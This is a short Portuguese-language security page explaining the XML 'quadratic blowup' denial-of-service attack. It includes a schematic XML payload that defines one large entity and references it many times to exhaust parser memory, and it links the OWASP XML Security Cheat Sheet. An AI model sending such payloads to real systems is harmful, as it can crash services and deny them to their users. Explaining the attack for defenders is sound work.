---
title: Explosão quadrática
---

Em vez de definir várias entidades pequenas e profundamente aninhadas, o invasor neste cenário define uma entidade muito grande e se refere a ela tantas vezes quanto possível, resultando em uma expansão quadrática (O(n2)).

O resultado do ataque a seguir terá 100.000 x 100.000 caracteres na memória.

```xml

<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>

```

## Referência externa

- [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)